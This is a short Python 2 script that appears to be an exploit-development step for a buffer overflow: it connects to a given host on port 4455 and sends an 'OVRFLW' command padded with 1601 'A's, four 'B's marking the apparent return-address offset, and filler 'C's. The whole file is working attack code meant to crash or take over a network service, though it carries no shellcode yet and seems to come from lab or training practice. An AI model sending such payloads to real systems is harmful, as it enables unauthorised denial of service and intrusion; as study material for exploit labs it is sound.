#!/usr/bin/python

import sys, socket

if len(sys.argv) <2:
    print "\nUsage: " + sys.argv[0] + " <HOST>\n"
    sys.exit()

cmd = "OVRFLW "
junk = "\x41" * 3000
end = "\r\n"

buffer = cmd + "A" * 1601 + "B" * 4 + "C" * (3000-1601-4) + end

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 4455))
s.send(buffer)
s.recv(1024)
s.close()
